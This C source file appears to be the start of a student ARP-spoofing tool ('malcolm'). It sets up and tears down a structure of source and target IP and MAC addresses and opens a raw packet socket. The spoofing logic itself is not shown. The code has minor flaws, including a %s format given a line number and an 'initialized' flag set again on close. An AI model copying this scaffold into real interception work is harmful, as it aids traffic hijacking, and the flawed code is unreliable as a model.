/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: niduches <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/13 14:52:10 by niduches          #+#    #+#             */
/*   Updated: 2021/09/13 16:18:08 by niduches         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "malcolm.h"

struct cstc_malcolm_data *ptr_cstc_gbl_malcolm_data = NULL;

uint8_t Fu8__init_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is already initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) != FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is already initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is already initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is already initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is not initialized as expected
        */
        } 

    /**
    * Creation of local variable
    */
    uint8_t u8_lcl_cnt;
    uint8_t u8_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    u8_lcl_cnt                  = 0;
    u8_lcl_return_from_function = RETURN_FAILURE;

    /**
    * Setting all the value of the global status of the structure to false
    */
    ptr_cstc_pssd_malcolm_data->u8_global_status_ = 0;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FIRST_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SECOND_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_THIRD_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FOURTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FIFTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SIXTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SEVENTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_EIGHTH_BIT;

    /**
    * Setting the zero all the ip address in the structure malcolm data passed in argument of the function
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < IP_ADDRESS_BYTE_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[u8_lcl_cnt] = 0;
        ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[u8_lcl_cnt] = 0;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Setting the zero all the mac address in the structure malcolm data passed in argument of the function
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < MAC_ADDRESS_BYTE_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt]    = 0;
        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt]    = 0;
        ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[u8_lcl_cnt] = 0;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Setting all the character of the interface name string to NIL
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < MAX_INTERFACE_NAME_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[u8_lcl_cnt] = NIL;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Initialize the structure program argument in the structure malcolm data passed in argument of the function
    */
    ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_global_status_ = 0;
    u8_lcl_return_from_function                                          = RETURN_FAILURE;
    u8_lcl_return_from_function                                          = Fu8__structure_argument_init(&(ptr_cstc_pssd_malcolm_data->sstc_program_argument_));

    /**
    * Check if function to init the structure program argument in the structure malcolm data passed in argument of the function succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to init the structure program argument in the structure malcolm data passed in argument of the function failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to init the structure program argument in the structure malcolm data passed in argument of the function failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to init the structure program argument in the structure malcolm data passed in argument of the function failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to init the structure program argument in the structure malcolm data passed in argument of the function succeeded
        */
        }

    /**
    * Getting the socket
    */
    ptr_cstc_pssd_malcolm_data->s32_socket_ = -1;
    ptr_cstc_pssd_malcolm_data->s32_socket_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    /**
    * Check if function to get the socket succeeded
    */
    if(ptr_cstc_pssd_malcolm_data->s32_socket_ == -1)
        {
        /**
        * Treat the case when the function to get the socket failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the socket failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get the socket failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the socket succeeded
        */
        }

    /**
    * Setting the structure argument to initialized
    */
    ptr_cstc_pssd_malcolm_data->u8_global_status_ |= FIRST_BIT;

    return (RETURN_SUCCESS);
    }

uint8_t Fu8__close_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        } 

    /**
    * Creation of local variable
    */
    int32_t s32_lcl_return_from_function;
    uint8_t u8_lcl_cnt;
    uint8_t u8_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    s32_lcl_return_from_function = -1;
    u8_lcl_cnt                  = 0;
    u8_lcl_return_from_function = RETURN_FAILURE;

    /**
    * Setting all the value of the global status of the structure to false
    */
    ptr_cstc_pssd_malcolm_data->u8_global_status_ = 0;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FIRST_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SECOND_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_THIRD_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FOURTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_FIFTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SIXTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_SEVENTH_BIT;
    ptr_cstc_pssd_malcolm_data->u8_global_status_ &= NOT_EIGHTH_BIT;

    /**
    * Setting the zero all the ip address in the structure malcolm data passed in argument of the function
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < IP_ADDRESS_BYTE_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[u8_lcl_cnt] = 0;
        ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[u8_lcl_cnt] = 0;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Setting the zero all the mac address in the structure malcolm data passed in argument of the function
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < MAC_ADDRESS_BYTE_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt]    = 0;
        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt]    = 0;
        ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[u8_lcl_cnt] = 0;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Setting all the character of the interface name string to NIL
    */
    u8_lcl_cnt = 0;
    while(u8_lcl_cnt < MAX_INTERFACE_NAME_LEN)
        {
        ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[u8_lcl_cnt] = NIL;

        /**
        * Checking for overflow
        */
        if(u8_lcl_cnt < UINT8_MAX)
            {
            u8_lcl_cnt++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 
        }

    /**
    * Check if the structure program argument in the structure malcolm data passed in argument of the function is initialized
    */
    if((ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_global_status_ & FIRST_BIT) != FALSE)
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is initialized
        */

        /**
        * Closing the structure program argument in the structure malcolm data passed in argument of the function
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__structure_argument_close(&(ptr_cstc_pssd_malcolm_data->sstc_program_argument_));

        /**
        * Check if function to close the structure program argument in the structure malcolm data passed in argument of the function succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the structure program argument in the structure malcolm data passed in argument of the function failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the structure program argument in the structure malcolm data passed in argument of the function failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the structure program argument in the structure malcolm data passed in argument of the function failed
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the structure program argument in the structure malcolm data passed in argument of the function succeeded
            */
            } 
        }
    else
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is not initialized
        */
        }

    /**
    * Check if the socket is valid
    */
    if(ptr_cstc_pssd_malcolm_data->s32_socket_ > 2)
        {
        /**
        * Treat the case when the socket is valid
        */

        /**
        * Closing the socket
        */
        s32_lcl_return_from_function = RETURN_FAILURE;
        s32_lcl_return_from_function = close(ptr_cstc_pssd_malcolm_data->s32_socket_);

        /**
        * Check if function to close the socket succeeded
        */
        if(s32_lcl_return_from_function < 0)
            {
            /**
            * Treat the case when the function to close the socket failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the socket failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the function to close the socket failed
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the socket succeeded
            */

            ptr_cstc_pssd_malcolm_data->s32_socket_ = -1;
            }
        }
    else
        {
        /**
        * Treat the case when the socket is not valid
        */

        ptr_cstc_pssd_malcolm_data->s32_socket_ = -1;
        }

    /**
    * Setting the structure argument to initialized
    */
    ptr_cstc_pssd_malcolm_data->u8_global_status_ |= FIRST_BIT;

    return (RETURN_SUCCESS);
    }

void Fv__display_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    #ifndef DEVELOPEMENT
    return ;
    #endif

    #ifdef DEMO
    return ;
    #endif

    #ifdef PRODUCTION
    return ;
    #endif

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return;
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return;
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        } 

    ft_printf("    ***********************************************\n");
    ft_printf("    *            STRUCTURE MALCOLM DATA           *\n");
    ft_printf("    ***********************************************\n\n");

    /**
    * Display all the value of the global status of the structure malcolm data passed in argument of the function
    */
    ft_printf("GLOBAL STATUS:\n");
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) != FALSE)
        {
        ft_printf("    FIRST BIT:     \033[1;93;40mset\033[0m structure initialized\n");
        }
    else
        {
        ft_printf("    FIRST BIT:     structure \033[1;95;40mNOT\033[0m initialized\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & SECOND_BIT) != FALSE)
        {
        ft_printf("    SECOND BIT:    \033[1;93;40mset error occure\033[0m\n");
        }
    else
        {
        ft_printf("    SECOND BIT:    \033[1;95;40mNOT\033[0m set no error occure\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & THIRD_BIT) != FALSE)
        {
        ft_printf("    THIRD BIT:     \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    THIRD BIT:     \033[1;95;40mNOT\033[0m set\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FOURTH_BIT) != FALSE)
        {
        ft_printf("    FOURTH BIT:    \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    FOURTH BIT:    \033[1;95;40mNOT\033[0m set\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIFTH_BIT) != FALSE)
        {
        ft_printf("    FIFTH BIT:     \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    FIFTH BIT:     \033[1;95;40mNOT\033[0m set\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & SIXTH_BIT) != FALSE)
        {
        ft_printf("    SIXTH BIT:     \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    SIXTH BIT:     \033[1;95;40mNOT\033[0m set\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & SEVENTH_BIT) != FALSE)
        {
        ft_printf("    SEVENTH BIT:   \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    SEVENTH BIT:   \033[1;95;40mNOT\033[0m set\n");
        }
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & EIGHTH_BIT) != FALSE)
        {
        ft_printf("    EIGHTH BIT:    \033[1;93;40mset\033[0m\n");
        }
    else
        {
        ft_printf("    EIGHTH BIT:    \033[1;95;40mNOT\033[0m set\n");
        }

    ft_printf("\n");

    ft_printf("SOURCE IP ADDRESS    : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[3]);

    ft_printf("SOURCE MAC ADDRESS   : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[5]);

    ft_printf("\n");

    ft_printf("TARGET IP ADDRESS    : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[3]);

    ft_printf("TARGET MAC ADDRESS   : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[5]);

    ft_printf("\n");

    ft_printf("INTERFACE MAC ADDRESS: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[5]);

    ft_printf("INTERFACE NAME       : [%s]\n", ptr_cstc_pssd_malcolm_data->u8_interface_name_str_);

    ft_printf("\n");

    ft_printf("SOCKET: %d\n", ptr_cstc_pssd_malcolm_data->s32_socket_);

    ft_printf("\n");

    (void) Fv__structure_argument_display(&(ptr_cstc_pssd_malcolm_data->sstc_program_argument_));

    ft_printf("\n    ***********************************************\n");
    ft_printf("    *          END STRUCTURE MALCOLM DATA         *\n");
    ft_printf("    ***********************************************\n");
    }

uint8_t Fu8__get_ip_from_string(uint8_t *ptr_u8_pssd_ip, uint8_t *ptr_u8_pssd_ip_str)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the array representing the ip is correctly pointing passed as an argument of the function
    */
    if(ptr_u8_pssd_ip == NULL)
        {
        /**
        * Treat the case when the array representing the ip is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the array representing the ip is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the array representing the ip is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the array representing the ip is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the ip string is correctly pointing passed as an argument of the function
    */
    if(ptr_u8_pssd_ip_str == NULL)
        {
        /**
        * Treat the case when the ip string is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the ip string is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the ip string is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the ip string is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Creation of local variable
    */
    uint32_t u32_lcl_tmp;
    uint8_t  u8_lcl_cnt;
    uint8_t  u8_lcl_pos;
    uint8_t  u8_lcl_pos_in_ip;

    /**
    * Initialization of local variable
    */
    u32_lcl_tmp      = 0;
    u8_lcl_cnt       = 0;
    u8_lcl_pos       = 0;
    u8_lcl_pos_in_ip = 0;

    u8_lcl_pos_in_ip = 0;
    while((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL))
        {
        u8_lcl_cnt = 0;
